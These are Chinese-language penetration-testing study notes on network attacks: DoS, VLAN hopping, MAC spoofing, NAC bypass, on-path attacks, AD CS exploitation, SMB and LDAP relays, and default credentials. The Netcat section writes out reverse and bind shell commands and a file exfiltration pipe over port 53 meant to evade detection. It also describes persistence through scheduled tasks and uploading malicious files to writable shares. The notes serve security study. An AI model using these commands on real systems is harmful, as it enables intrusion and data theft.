# 網路攻擊

## 基本概念

- **Network Attacks**（網路攻擊）：針對網路基礎設施的各種方法與工具，目的是獲取未授權存取、竊取資料和干擾正常運作
  - 可以針對網路的不同層級，從實體網路元件到應用層級互動

## 主要攻擊技術

- **Stress Testing**（壓力測試）：通過高負載條件測試網路，發現潛在故障點、弱點和拒絕服務攻擊的易受性

- **Bypassing Segmentation**（繞過網路分段）：用於繞過網路分段措施的技術，這些分段通常用於隔離網路不同部分以提高安全性

- **MAC Spoofing**（MAC 位址欺騙）：攻擊者透過複製 MAC 位址將自己的裝置偽裝為網路上的合法裝置，以繞過網路存取控制

- **NAC Bypass**（網路存取控制繞過）：用於規避網路存取控制系統的方法，這些系統旨在基於裝置安全政策合規性限制網路存取

- **Session-based Attacks**（基於會話的攻擊）：包括：
  - **On-path attacks**（路徑上攻擊）
  - **Relay attacks**（中繼攻擊）
  - **Web session manipulation**（網頁會話操縱）
  - 目的是冒充使用者並獲取未授權的應用程式存取

- **Service Exploitation**（服務漏洞利用）：利用網路服務和協議中的弱點，獲取未授權存取或中斷服務

- **Packet Crafting**（封包製作）：製作特殊封包以利用網路裝置和協議的過程

## 攻擊工具

- **Netcat**（網路工具）：多功能網路工具，常被稱為「網路瑞士軍刀」
  - 具備監聽、連接和管理 TCP/UDP 連接的能力

- **Metasploit**（滲透測試框架）：強大的漏洞利用開發和執行工具
  - 用於針對遠端目標機器開發和執行漏洞利用程式碼

## 常見攻擊向量

- **Default Network Credentials**（預設網路憑證）：使用原廠設定的憑證所帶來的風險，是網路安全中簡單但重大的弱點

- **LLMNR/NBT-NS Poisoning**（LLMNR/NBT-NS 中毒攻擊）：
  - **Link-Local Multicast Name Resolution**（連結本地多播名稱解析）
  - **NetBIOS Name Service**（NetBIOS 名稱服務）
  - 利用較舊的網路協議來重定向流量或攔截現代網路上的資料

- **ARP Poisoning**（ARP 中毒攻擊）：將攻擊者的 MAC 位址與有效網路位址連結的技術，使攻擊者能夠攔截原本應發送給合法主機的資料

# 拒絕服務攻擊與壓力測試

## 基本概念

- **Stress Testing**（壓力測試）：一種軟體測試方法，評估軟體在極端負載下的表現性能。
  - 可應用於不同系統和網頁伺服器
  - 極端負載可包括：處理器負載、記憶體負載、網路負載等
  - 目的是確定目標系統在處理器、記憶體、網路或存儲方面的極限

- **DoS (Denial-of-Service)**（拒絕服務攻擊）：使目標系統或服務無法正常運作的攻擊。
  - 通常來自單一主機
  - 在壓力測試過程中可能非預期觸發
  - 應在測試前獲得目標組織的明確許可

- **DDoS (Distributed Denial-of-Service)**（分散式拒絕服務攻擊）：由多個來源同時發起的拒絕服務攻擊。
  - 使用多台電腦協同攻擊單一目標
  - 透過控制大量殭屍電腦傳送流量
  - 相較於DoS威力更強大

## 系統擴展方式

- **Vertical Scaling**（垂直擴展）：增加單一伺服器的資源。
  - 例如從低配置升級至高配置VPS
  - 增加虛擬CPU和記憶體容量
  - 有其物理極限，最終會達到上限

- **Horizontal Scaling**（水平擴展）：增加更多的伺服器來分擔負載。
  - 比垂直擴展更複雜但提供更大的擴展性
  - 可通過負載平衡在多台伺服器間分配請求
  - 理論上可無限擴展

## 壓力測試工具

- **Grinder**：開源壓力測試工具。
  - 用於測試網站的可用性和功能性
  - 從單一機器運行，類似於DoS攻擊

- **Software-as-a-Service (SaaS) 解決方案**：線上壓力測試服務。
  - 包括LoadView、LoadNinja、Loader等
  - 可模擬分散式拒絕服務攻擊
  - 從多個伺服器或機器人發送請求
  - 可模擬數百或數千用戶的同時訪問

## 攻擊技術

- **Packet Storm**（封包風暴）：也稱為Broadcast Storm或Network Storm。
  - 指向特定目標發送大量網路流量
  - 用於測試目標是否能緩解DoS攻擊

- **CHARGEN Attack**（字元產生器攻擊）：
  - 利用Character Generator Protocol進行的攻擊
  - 使用TCP或UDP協定的19埠
  - 可產生無限量的隨機ASCII字元
  - 特別適合UDP方式，可放大200-1000倍的資料量
  - 攻擊者可偽造來源IP，讓CHARGEN伺服器攻擊受害伺服器

# 網段繞過

## 主要概念

- **Segmentation Bypassing**（網段繞過）：繞過網路分段控制的技術
  - 用於測試網路分段安全性的有效性
  - 攻擊者通常利用此技術在網路中橫向移動，以訪問受限區域

- **VLAN Hopping**（VLAN 跨越）：利用 VLAN 配置漏洞獲取未授權網路區段訪問權的技術
  - 在數據鏈路層（Layer 2）操作
  - 繞過邏輯隔離以訪問受限網路資源

- **Multihomed Hosts**（多宿主主機）：具有多個網路介面的設備，每個介面連接到不同網路
  - 常用於冗餘、負載均衡或網路分段
  - 若管理不當，可能成為隔離網路間的流量管道

## 詳細分析

### Segmentation Bypassing（網段繞過）

- **Network Segmentation**（網路分段）：將網路分割成較小的區段的安全實踐
  - 目的是限制潛在攻擊的擴散並控制威脅範圍
  - 攻擊者尋找方法繞過這些控制，在網路中橫向移動

- **繞過方法**：
  - 針對弱設定或錯誤配置的防火牆進行攻擊
  - 使用被盜用的憑證訪問多個網段
  - 發現網段間未受保護的路徑

- **實際案例**：公司網路中各部門（HR、財務、IT、銷售）間的分段繞過
  - 攻擊者發現銷售和財務部門之間存在錯誤配置的防火牆規則
  - 允許特定流量（如 TCP 1433 端口）通行
  - 使用 Nmap 進行網路掃描發現漏洞
  - 利用 Mimikatz 收集憑證，再用 Hashcat 破解密碼哈希
  - 最終取得敏感財務資料

### VLAN Hopping（VLAN 跨越）

- **VLAN**（虛擬局域網）：用於在數據鏈路層分段網路流量
  - 在同一物理網路上創建隔離的網路區段
  - 如果配置不當，攻擊者可以在這些區段間移動

- **主要方法**：
  - **Switch Spoofing**（交換機欺騙）：
    - 攻擊者將設備配置成模擬主幹交換機（trunk switch）
    - 可以通過單一物理連接攜帶多個 VLAN
    - 獲取對多個 VLAN 的訪問權限
  
  - **Double Tagging**（雙重標籤）：
    - 攻擊者發送帶有兩個 VLAN 標籤的數據包
    - 第一個交換機去除第一個標籤
    - 基於第二個標籤將數據包轉發到第二個 VLAN
    - 允許攻擊者訪問不同的 VLAN

- **案例**：測試資料中心安全性
  - 使用雙重標籤技術繞過 VLAN 分段
  - 訪問不同 VLAN 中的敏感系統
  - 展示了嚴重的安全問題，可能導致關鍵系統被攻破

### Multihomed Hosts（多宿主主機）

- **定義**：具有多個網路介面的設備，每個介面連接到不同網路
  - 用於冗餘、負載均衡或網路分段
  - 若未妥善管理，可能構成安全風險

- **安全風險**：
  - 可能成為原本隔離網路間的通道
  - 被攻擊者利用後可能連接不同網路區段
  - 促進橫向移動，擴大攻擊範圍

- **實際案例**：
  - 識別同時連接到內部網路和 DMZ 的伺服器
  - 利用伺服器漏洞獲取對兩個網路的訪問權
  - 進一步發起攻擊並竊取資料
  - 突顯了多宿主主機的風險和嚴格訪問控制的需求

## 實用技術與工具

- **識別與利用方法**：
  - 網路掃描
  - 流量分析
  - 利用已知漏洞

- **常用工具**：
  - **Nmap**：用於映射網路和識別潛在的利用點
  - **Mimikatz**：憑證收集工具
  - **Hashcat**：密碼哈希破解工具

- **關鍵注意事項**：
  - 漏洞測試需要結合自動化工具和手動分析
  - 測試過程中需識別特定弱點和錯誤配置
  - 滲透測試目的是強化安全，防止真實攻擊

# MAC Spoofing

- **Spoofing（欺騙）**：一種網路攻擊類別，攻擊者通過偽造身份冒充他人
  - 類似於現實生活中戴面具隱藏真實身份的電子等效方式
  - 任何能識別用戶或系統的信息都可能被欺騙

## MAC 地址基本概念

- **MAC Address（媒體存取控制位址）**：用於物理識別裝置並允許其在邏輯拓撲上運作的地址
  - 在第二層（Layer 2）網路環境中用於交換機網路的通訊
  - 是 48 位元的實體位址，以 12 位十六進制數表示
  - 組成部分：
    - 前 24 位元（前 6 位十六進制數）：識別製造商（OUI）
    - 後 24 位元（後 6 位十六進制數）：識別特定裝置

- **MAC 地址的網路功能**：
  - 交換機和橋接器使用 MAC 地址將裝置與實體連接埠相關聯
  - 數據只發送到與目標 MAC 地址相關聯的實體端口
  - 增加網路速度和數據安全性

## MAC 過濾與安全

- **MAC Filtering（MAC 過濾）**：一種基本的網路存取控制（NAC）形式
  - 常用於無線網路安全
  - 類型：
    - Allowlist（允許清單）：只允許特定 MAC 地址連接
    - Blocklist（阻擋清單）：禁止特定 MAC 地址連接

## MAC 欺騙技術

- **MAC Spoofing（MAC 欺騙）**：改變裝置的 MAC 地址以繞過 MAC 過濾
  - 儘管 MAC 地址燒錄在網卡中，大多數作業系統允許覆寫這個值
  - 用途：
    - 繞過允許清單：改變 MAC 地址為允許清單中的值
    - 避開阻擋清單：使用隨機 MAC 地址

- **MAC 地址修改工具**：
  - 在 macOS 中使用終端命令：`sudo ifconfig en0 ether [新MAC地址]`
  - 在 Kali Linux 中使用 macchanger 工具：
    - `macchanger -m [MAC地址] [介面]`：指定特定 MAC 地址
    - `macchanger -r [介面]`：指派隨機 MAC 地址
  - 修改後的 MAC 地址通常在重啟後會恢復為原始值

- **實際應用場景**：
  - 滲透測試時繞過網路安全限制
  - 避開公共 Wi-Fi 的時間限制（例如機場、咖啡廳的 15 分鐘免費 Wi-Fi）

## 從安全角度的意義

- MAC 欺騙可用於：
  - 繞過基於 MAC 的訪問控制
  - 隱藏真實身份
  - 在進行滲透測試時模擬網路裝置

# 網路存取控制

- **Network Access Control (NAC)（網路存取控制）**：一種用於防止未授權使用者或設備訪問私有網路的技術
  - 在裝置被允許訪問網路前，會先掃描裝置以確定其當前狀態
  - 可應用於內部網路的實體設備或透過 VPN 遠端連接的裝置
  - 主要目的是防止缺乏防毒軟體、安全更新或主機入侵防護軟體的終端設備訪問網路

- **NAC 的基本運作方式**：
  - 基本形式可能僅檢查網路卡的 MAC 位址來決定裝置是否可連接
  - 較新的 NAC 系統更為複雜，會在連接過程中將裝置置於虛擬隔離區進行掃描
  - 檢查項目包括：病毒定義是否最新、安全補丁狀態及其他可能造成安全威脅的因素

- **NAC 檢查結果處理**：
  - 通過檢查的裝置：允許進入並獲得網路資源訪問權限
  - 未通過檢查的裝置：被置於數位隔離與修復區域
    - 在隔離區可接收防毒更新、作業系統補丁等安全服務
    - 但無法與網路其他部分進行邏輯通訊
    - 滿足 NAC 要求後才能獲得完整網路訪問權限

- **NAC 系統類型**：
  - **Persistent Agents（持久性代理）**：
    - 安裝在請求訪問網路的裝置上的軟體
    - 適用於企業環境，因組織擁有所有裝置並控制其軟體基準
  
  - **Non-persistent Agent（非持久性代理）**：
    - 常見於大學校園
    - 用戶需連接網路（通常透過 Wi-Fi），登入網頁入口並點擊連結
    - 下載的代理會掃描裝置合規性，完成後自動刪除

  - **Agentless NAC（無代理 NAC）**：
    - 也稱為 Volatile solutions（揮發性解決方案）
    - 掃描引擎安裝在域控制器而非終端裝置上
    - 適用於 BYOD 政策或無法在終端裝置安裝代理的情況
    - 完全在裝置的揮發性 RAM 中運行

- **如何繞過複雜的 NAC 解決方案**：
  - **選項一：利用已授權主機**
    - 通過攻擊已授權的裝置（如公司筆電）作為跳板
    - 即使 NAC 解決方案依賴數位憑證與 802.1X 認證，也可繞過
    - 通過已授權裝置轉發流量，繞過 NAC 設備及其檢查

  - **選項二：偽裝攻擊工作站**
    - 讓攻擊工作站看起來像不受 NAC 檢查的設備（如 VoIP 電話）
    - 許多 NAC 設備有基於 MAC 地址的允許清單（主要包括 VoIP 電話、視訊會議終端、印表機等）
    - 這些設備通常不需接受檢查，因為它們沒有支援 NAC 檢查的原生作業系統
    - 潛在問題：這些裝置通常被隔離在獨立的 VLAN 中，可能需要進行 VLAN 跳躍攻擊才能訪問其他網段

# On-Path Attack（路徑中攻擊、中間人攻擊）

- **On-Path Attack**（路徑中攻擊）：一種攻擊方式，攻擊者在兩台主機通訊過程中，將自己的工作站邏輯上放置在兩者之間，以透明方式捕獲、監控和轉發這些主機之間的通訊
  - 攻擊者放置自己在客戶端與伺服器之間的路徑上，可以攔截授權封包，進而接管授權的會話
  - 又稱為「interception attack」（攔截攻擊）

## 實施方法

- **實施 On-Path Attack 的方式**：
  - ARP 中毒（ARP poisoning）
  - DNS 中毒（DNS poisoning）
  - 引入惡意無線存取點（rogue Wireless Access Point）
  - 引入惡意集線器或交換機（rogue hub or switch）

## 攻擊技術

- **Replay Attack**（重放攻擊）：攻擊者捕獲有效數據後立即重放或延遲後重放
  - 常見於無線網路攻擊，但也適用於有線網路
  - 例如：捕獲認證握手過程再重放給認證伺服器，使其誤以為是認證客戶端

- **Relay Attack**（中繼攻擊）：攻擊者透過插入自己在兩台主機之間成為通訊的一部分
  - 攻擊者實際上成為兩台主機之間的代理（proxy）
  - 可以讀取或修改兩者間的任何通訊內容
  - 可捕獲用戶名、密碼和其他敏感資訊，甚至可以修改資料

## 繞過加密的技術

- **SSL Stripping**（SSL 剝離）：這是一種技術用於繞過網站使用的 SSL/TLS 加密
  - 欺騙加密應用程式向用戶顯示 HTTP 連接而非 HTTPS 連接
  - 例如：將用戶對 facebook.com 的 HTTPS 請求重定向或降級為普通 HTTP 連接

- **Downgrade Attack**（降級攻擊）：攻擊者試圖使客戶端或伺服器放棄高安全性模式，改用低安全性模式
  - 例如：將 TLS 1.2/1.3 降級至更易破解的 SSL 2.0
  - 不僅影響 SSL/TLS，還可用於 Wi-Fi、VPN 等任何具有多級安全性的協議

## 偵測方法

- **網路減速**：若網路運行速度比平常慢得多，可能是攻擊者正在使用您的資源
- **HTTPS 降級到 HTTP**：如果網站的 URL 突然從 "HTTPS" 變成 "HTTP"，可能表示攻擊者已經進行了 SSL 剝離

## 進階攻擊類型

- **On-Path Browser Attack**（瀏覽器路徑中攻擊）：這種攻擊（也稱為 man-in-the-browser 攻擊）是在受害者的同一設備上執行的
  - 裝置上的惡意軟體或木馬被配置為能夠在與網路傳送前後重定向流量的代理
  - 即使網路流量已加密，此類攻擊仍能看到所有明文信息，因為它在與受害者相同的設備上運行

# 服務漏洞利用

## 證書服務攻擊

- **Certificate Services Attacks**（證書服務攻擊）：針對數位證書管理系統的弱點進行利用的攻擊
  - 數位證書用於建立加密和身份驗證的安全通訊
  - 攻擊者可能攔截或偽造證書，實現中間人攻擊
  - 可能通過利用配置不當的證書授權機構來提升權限

- **Active Directory Certificate Services (AD CS)**（活動目錄憑證服務）：Microsoft的企業級公鑰基礎設施(PKI)實現
  - 在AD網絡中作為憑證授權機構(CA)運作
  - 多種安全漏洞利用方式（ESC1-ESC8）可導致特權提升攻擊

- **ESC1 Certificate Exploitation**（ESC1憑證漏洞利用）：
  - 利用AD CS樣板中的錯誤配置
  - 攻擊者可以請求證書，使用Kerberos PKINIT進行身份驗證
  - 可執行特權提升至網域管理員

- **ESC4 Vulnerability**（ESC4漏洞）：
  - 由於憑證樣板上的存取控制項目(ACEs)配置錯誤導致
  - 允許未授權用戶修改憑證樣板的安全設定

- **ESC7 Vulnerability**（ESC7漏洞）：
  - 針對憑證授權機構(CA)內的弱訪問控制進行利用
  - 透過獲取關鍵權限如ManageCA和Manage Certificates來攻擊

- **加密算法與安全性**：
  - 過時加密算法（如MD5）容易受到碰撞攻擊
  - 攻擊者可利用此創建偽造憑證，冒充信任服務
  - 應使用更安全的算法（如SHA-256）

## 服務錯誤配置利用

- **Misconfigured Service Exploitation**（錯誤配置服務利用）：利用系統服務中的錯誤設定實施攻擊
  - 針對使用默認設置、擁有不必要特權或缺乏適當存取控制的服務
  - 可能導致未授權訪問、特權提升和數據洩漏

- **目錄列表漏洞**（Directory Listing）：
  - 網頁伺服器配置中的常見錯誤
  - 允許攻擊者瀏覽不應公開的目錄內容
  - 如訪問 `/backup` 目錄可能暴露關鍵系統檔案

- **敏感檔案暴露**：
  - 資料庫備份文件（database_backup.sql）
  - 配置文件（config.php）
  - 錯誤日誌（error log）
  - 這些文件可能包含可用於進一步攻擊的關鍵信息

## 共享枚舉攻擊

- **Share Enumeration**（共享枚舉）：發現網絡上共享資源（如文件夾和印表機）的過程
  - 文件共享服務若未正確設定，會帶來顯著安全風險
  - 攻擊者利用共享枚舉識別可能包含敏感信息的共享資源

- **SMBClient工具**：用於Windows網絡共享枚舉的工具
  - 基本列舉命令：`smbclient -L [目標IP] -U [使用者名稱]`
  - 用於識別可能可訪問的共享資源

- **共享資源訪問**：
  - 訪問共享：`smbclient \$$目標IP]$$共享名稱] -U [使用者名稱]`
  - 可能發現敏感數據或其他安全弱點

- **可寫共享利用**：
  - 上傳惡意腳本或可執行檔案到可寫共享
  - 使用命令：`smbclient \$$目標IP]$$可寫共享] -U [使用者名稱]` 後使用 `put [惡意文件]`
  - 上傳後的文件可被執行，獲取遠程訪問或提升權限

## 滲透測試工具

- **Certify/Certipy**：
  - 用於AD CS漏洞利用的紅隊工具
  - 可用於測試和利用易受攻擊的證書樣板

- **PSPKI cmdlets**：
  - 用於管理和操作PKI基礎設施的PowerShell模組
  - 攻擊者可使用這些cmdlets攻擊ESC6和ESC7等漏洞

- **ForgeCert**：
  - 用於證書偽造的工具
  - 可創建"黃金證書"用於持久性攻擊

# 封包偽造與 Impacket 攻擊技術

- **Packet Crafting**（封包偽造）：創建自定義網路封包以測試網路設備、模擬攻擊或探索漏洞的技術
  - 允許安全測試人員操控封包標頭和有效負載，觀察網路設備的回應
  - 可用於識別網路防禦弱點、探測防火牆規則及測試入侵偵測系統
  - 常用工具包括 Scapy、Hping 和 Impacket

- **Impacket**：用於處理網路協議的 Python 類別集合工具
  - 支援多種協議，包括 SMB、MSRPC 和 LDAP 等
  - 對滲透測試人員非常有用的工具
  - 可用於執行各種網路攻擊

## SMB 中繼攻擊

- **SMB Relay Attack**（SMB 中繼攻擊）：利用 SMB 協議攔截並中繼身份驗證嘗試，獲取未授權系統存取權限
  - 使用 Impacket 的 `smbrelayx` 工具
  - 設置環境：確保攻擊者機器與目標在同一網路中
  - 命令格式：需要指定攻擊者 IP、目標 IP 和要中繼的用戶憑證
  - 攔截 SMB 身份驗證並中繼到目標系統
  - 獲得與被中繼用戶相同權限的系統存取權

## LDAP 中繼攻擊

- **LDAP Relay Attack**（LDAP 中繼攻擊）：類似 SMB 攻擊，但針對 LDAP 身份驗證
  - 使用 Impacket 的 `ntlmrelayx.py` 工具
  - 監聽傳入的 NTLM 身份驗證請求並將其中繼到指定的 LDAP 服務器
  - 成功後可執行各種 LDAP 操作，如查詢用戶資訊或修改條目

## 使用 Scapy 進行封包偽造

- **Scapy**：提供更靈活的低階封包偽造功能
  - Python 腳本示例：創建並發送自定義 TCP SYN 封包
  - 程式碼結構：
    - 導入 Scapy 庫 `from scapy.all import *`
    - 使用 `IP()` 函數創建 IP 層，設定目標和來源 IP
    - 使用 `TCP()` 函數創建 TCP 層，設定目標和來源端口
    - 設定 TCP 標誌為 "S"（SYN）表示初始化 TCP 連接
    - 使用 `/` 運算符組合 IP 和 TCP 層
    - 使用 `send()` 函數發送偽造封包
    - 可選用 `print(packet.show())` 顯示封包詳情以便驗證和調試

# Netcat

## 基本概念

- **Netcat**（nc）：在 Linux 中的命令行工具
  - 用於透過網路連接讀取和寫入原始資料
  - 可用來建立 bind shell 和 reverse shell

## Shell 類型

- **Bind Shell**（綁定 Shell）：在受害者機器上開啟監聽埠，讓攻擊者可連接至該埠
  - 監聽程式安裝在受害者機器上
  - 攻擊者連接到受害者機器的監聽埠
  - 指令會重導向至受害者的命令提示字元執行
  - 優點：系統持續等待攻擊者連線，任何時間都可存取
  - 缺點：需穿透防火牆和 NAT，不適合從外部網路進行攻擊

- **Reverse Shell**（反向 Shell）：攻擊者在自己機器上設置監聽器，讓受害者主動連接
  - 監聽程式安裝在攻擊者機器上
  - 受害者機器主動發起對攻擊者監聽埠的連線
  - 建立雙向通道後，攻擊者可向受害者發送指令
  - 優點：可繞過大多數防火牆（因為是從內部發起的連接）
  - 適用於從外部網路進行攻擊

## 操作方式

- **Bind Shell 建立方式**：
  - 在受害者機器上執行：`nc -l -p 443 -e cmd.exe`
  - 攻擊者連接：`nc 10.1.0.1 443`

- **Reverse Shell 建立方式**：
  - 在攻擊者機器上執行：`nc -l -p 443`
  - 在受害者機器上執行：`nc 10.1.0.2 443 -e cmd.exe`

- **文件傳輸技巧**：
  - 攻擊者設置接收：`nc -l -p 53 > database.sql`
  - 受害者傳送：`type database.sql | nc 10.1.0.2 53`
  - 使用非標準埠（如 53）可偽裝成正常流量避開檢測

## 取得反向連線的方法

- **社交工程**：欺騙使用者安裝惡意軟體
- **漏洞利用**：針對已知弱點執行攻擊
- **持久性技巧**：設定排程任務使受害者定期連線
  - 可設定每日特定時間呼叫監聽器
  - 可採用更隱匿的方式：不使用時中斷連線，定期重連

# Default Credentials

- **Default Credentials**（預設憑證）：出廠設備或應用程式預先設定的使用者名稱和密碼
  - 這些憑證原本應在安裝後被變更，但常常未被更改，導致系統容易遭受攻擊
  - 由於預設憑證廣為人知，攻擊者可輕易取得並利用來進行未授權存取

- **Default Credentials 的常見目標**：
  - 網路設備：路由器、交換機、IP 攝影機
  - 軟體應用程式：資料庫、網頁應用程式
  - 網路印表機：可能儲存和轉發掃描文件，成為敏感資料洩漏點

- **常見的預設憑證範例**：
  - 路由器：username: admin / password: admin 或 password
  - MySQL 資料庫：root 帳號常使用無密碼或簡單密碼如 "root"

- **自動化檢測工具**：
    - Nmap 搭配 http-default-accounts 腳本
    - Hydra 和 Medusa：可執行使用預設使用者名稱和密碼的暴力破解攻擊
    - Nessus 等漏洞掃描工具

- **攻擊途徑**：
  - 密碼噴灑攻擊（Password Spraying）：使用包含大量預設密碼的字典檔
  - 橫向移動（Lateral Movement）：利用預設憑證獲得一個設備的存取權後，取得資訊來移動到網路的其他部分
  - 流量攔截：透過網路交換機的預設憑證取得存取權，進而攔截和分析流量

- **真實案例**：2013 年 Target 資料外洩事件
  - 攻擊者從第三方供應商 Fazio Mechanical Services 竊取憑證
  - 使用被竊取的憑證存取 Target 存儲供應商資訊的伺服器
  - 由於該伺服器使用預設憑證，攻擊者成功竊取了：
    - 超過 4,000 萬 Target 客戶的信用卡和借記卡資訊
    - 超過 7,000 萬客戶的個人資訊（姓名、地址、電話號碼等）

- **檢測方法**：
    - 手動網路應用安全測試
    - 配置稽核：檢查系統設定識別未更改的憑證
    - 網路流量分析：檢查日誌中重複使用預設使用者名稱的登入嘗試

- **防護建議**：
  - 立即變更所有預設密碼，尤其是初始安裝時
  - 定期進行安全掃描檢測潛在的預設憑證漏洞
  - 實施強密碼政策和多因素認證

- **Default Credential 資源**：
  - [default-password.info](https://default-password.info/) 提供各製造商設備的預設密碼清單
  - [The Hacker Recipes](https://www.thehacker.recipes/web/config/default-credentials) 提供相關測試方法